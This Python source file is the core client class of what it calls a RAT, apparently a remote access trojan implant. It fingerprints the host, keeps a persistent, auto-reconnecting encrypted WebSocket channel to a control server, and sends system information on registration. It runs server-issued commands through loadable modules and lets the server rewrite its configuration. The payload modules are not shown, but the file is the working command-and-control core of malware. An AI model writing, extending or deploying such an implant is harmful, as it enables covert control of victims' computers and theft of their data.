"""
RAT Client Core - Main client application class
"""

import asyncio
import logging
import platform
import socket
import uuid
from datetime import datetime
from typing import Dict, Optional

import websockets
from websockets.exceptions import ConnectionClosed, InvalidURI

from .config import ClientConfig
from .security import ClientSecurity
from ..modules.module_manager import ModuleManager
from ..network.connection_manager import ConnectionManager
from ..utils.system_info import SystemInfoCollector


class RATClient:
    """Main RAT client application"""

    def __init__(self, config: ClientConfig):
        self.config = config
        self.logger = logging.getLogger(__name__)

        # Core components
        self.security = ClientSecurity()
        self.connection_manager = ConnectionManager(config, self.security)
        self.module_manager = ModuleManager(config)
        self.system_info = SystemInfoCollector()

        # State
        self.client_id = config.client_id or self._generate_client_id()
        self.is_running = False
        self.websocket = None
        self.heartbeat_task = None

        # Update client ID in config if generated
        if not config.client_id:
            config.client_id = self.client_id

    def _generate_client_id(self) -> str:
        """Generate unique client identifier"""
        hostname = socket.gethostname()
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                               for elements in range(0, 2*6, 2)][::-1])
        return f"{hostname}_{mac_address}_{uuid.uuid4().hex[:8]}"

    async def start(self):
        """Start the client application"""
        self.logger.info(f"Starting RAT Client - ID: {self.client_id}")

        # Initialize modules
        await self.module_manager.initialize()

        # Start connection loop
        self.is_running = True
        await self._connection_loop()

    async def stop(self):
        """Stop the client application"""
        self.logger.info("Stopping RAT Client")

        self.is_running = False

        # Stop heartbeat
        if self.heartbeat_task:
            self.heartbeat_task.cancel()

        # Close WebSocket connection
        if self.websocket:
            await self.websocket.close()

        # Cleanup modules
        await self.module_manager.cleanup()

    async def _connection_loop(self):
        """Main connection loop with reconnection logic"""
        reconnect_count = 0

        while self.is_running:
            try:
                await self._connect_to_server()
                reconnect_count = 0  # Reset on successful connection

            except Exception as e:
                self.logger.error(f"Connection error: {e}")

                if reconnect_count >= self.config.max_reconnect_attempts:
                    self.logger.error("Maximum reconnection attempts reached")
                    break

                reconnect_count += 1
                wait_time = min(self.config.reconnect_interval * reconnect_count, 300)
                self.logger.info(f"Reconnecting in {wait_time} seconds (attempt {reconnect_count})")

                await asyncio.sleep(wait_time)

    async def _connect_to_server(self):
        """Connect to the server and handle messages"""
        connection_url = self.config.get_connection_url()
        self.logger.info(f"Connecting to server: {connection_url}")

        # Prepare connection headers
        headers = {
            "Client-ID": self.client_id,
            "Client-Version": "2.0.0",
            "Platform": platform.system(),
            "Architecture": platform.machine()
        }

        # Add authentication if available
        if self.config.api_key:
            headers["Authorization"] = f"Bearer {self.config.api_key}"

        try:
            async with websockets.connect(
                connection_url,
                extra_headers=headers,
                ping_interval=self.config.heartbeat_interval,
                ping_timeout=self.config.connection_timeout,
                close_timeout=10
            ) as websocket:
                self.websocket = websocket
                self.logger.info("Connected to server successfully")

                # Send initial registration
                await self._send_registration()

                # Start heartbeat task
                self.heartbeat_task = asyncio.create_task(self._heartbeat_loop())

                # Handle incoming messages
                await self._message_handler()

        except (ConnectionClosed, InvalidURI) as e:
            self.logger.error(f"WebSocket connection error: {e}")
            raise
        except Exception as e:
            self.logger.error(f"Unexpected connection error: {e}")
            raise

    async def _send_registration(self):
        """Send client registration information"""
        system_info = await self.system_info.collect_full_info()

        registration_data = {
            "type": "registration",
            "client_id": self.client_id,
            "timestamp": datetime.utcnow().isoformat(),
            "system_info": system_info,
            "enabled_modules": self.config.enabled_modules,
            "version": "2.0.0"
        }

        await self._send_message(registration_data)
        self.logger.info("Registration sent to server")

    async def _heartbeat_loop(self):
        """Send periodic heartbeat messages"""
        while self.is_running and self.websocket:
            try:
                heartbeat_data = {
                    "type": "heartbeat",
                    "client_id": self.client_id,
                    "timestamp": datetime.utcnow().isoformat(),
                    "status": "active"
                }

                await self._send_message(heartbeat_data)
                await asyncio.sleep(self.config.heartbeat_interval)

            except asyncio.CancelledError:
                break
            except Exception as e:
                self.logger.error(f"Heartbeat error: {e}")
                break

    async def _message_handler(self):
        """Handle incoming messages from server"""
        try:
            async for message in self.websocket:
                try:
                    # Decrypt message if encryption is enabled
                    if self.config.encryption_enabled:
                        message = self.security.decrypt_message(message)

                    # Parse and handle message
                    await self._handle_message(message)

                except Exception as e:
                    self.logger.error(f"Message handling error: {e}")

        except ConnectionClosed:
            self.logger.info("Server connection closed")
        except Exception as e:
            self.logger.error(f"Message handler error: {e}")

    async def _handle_message(self, message: str):
        """Handle incoming message from server"""
        try:
            import json
            data = json.loads(message)

            message_type = data.get("type")
            command_id = data.get("command_id")

            self.logger.debug(f"Received message type: {message_type}")

            if message_type == "command":
                await self._handle_command(data, command_id)
            elif message_type == "config_update":
                await self._handle_config_update(data)
            elif message_type == "module_control":
                await self._handle_module_control(data)
            elif message_type == "ping":
                await self._send_pong(command_id)
            else:
                self.logger.warning(f"Unknown message type: {message_type}")

        except json.JSONDecodeError as e:
            self.logger.error(f"Invalid JSON message: {e}")
        except Exception as e:
            self.logger.error(f"Message handling error: {e}")

    async def _handle_command(self, data: dict, command_id: str):
        """Handle command from server"""
        command = data.get("command")
        module_name = data.get("module")
        parameters = data.get("parameters", {})

        try:
            # Execute command through module manager
            result = await self.module_manager.execute_command(
                module_name, command, parameters
            )

            # Send response back to server
            response = {
                "type": "command_response",
                "command_id": command_id,
                "client_id": self.client_id,
                "success": True,
                "result": result,
                "timestamp": datetime.utcnow().isoformat()
            }

        except Exception as e:
            self.logger.error(f"Command execution error: {e}")
            response = {
                "type": "command_response",
                "command_id": command_id,
                "client_id": self.client_id,
                "success": False,
                "error": str(e),
                "timestamp": datetime.utcnow().isoformat()
            }

        await self._send_message(response)

    async def _handle_config_update(self, data: dict):
        """Handle configuration update from server"""
        try:
            new_config = data.get("config", {})
            self.config.update_from_server(new_config)

            # Save updated configuration
            self.config.save_to_file(self.config.config_file)

            self.logger.info("Configuration updated from server")

        except Exception as e:
            self.logger.error(f"Config update error: {e}")

    async def _handle_module_control(self, data: dict):
        """Handle module control commands"""
        try:
            action = data.get("action")  # enable, disable, reload
            module_name = data.get("module")

            if action == "enable":
                await self.module_manager.enable_module(module_name)
            elif action == "disable":
                await self.module_manager.disable_module(module_name)
            elif action == "reload":
                await self.module_manager.reload_module(module_name)

            self.logger.info(f"Module {module_name} {action} completed")

        except Exception as e:
            self.logger.error(f"Module control error: {e}")

    async def _send_pong(self, command_id: str):
        """Send pong response to ping"""
        pong_data = {
            "type": "pong",
            "command_id": command_id,
            "client_id": self.client_id,
            "timestamp": datetime.utcnow().isoformat()
        }
        await self._send_message(pong_data)

    async def _send_message(self, data: dict):
        """Send message to server"""
        try:
            import json
            message = json.dumps(data)

            # Encrypt message if encryption is enabled
            if self.config.encryption_enabled:
                message = self.security.encrypt_message(message)

            if self.websocket:
                await self.websocket.send(message)

        except Exception as e:
            self.logger.error(f"Send message error: {e}")

    async def send_notification(self, notification_type: str, data: dict):
        """Send notification to server"""
        notification = {
            "type": "notification",
            "notification_type": notification_type,
            "client_id": self.client_id,
            "data": data,
            "timestamp": datetime.utcnow().isoformat()
        }
        await self._send_message(notification)
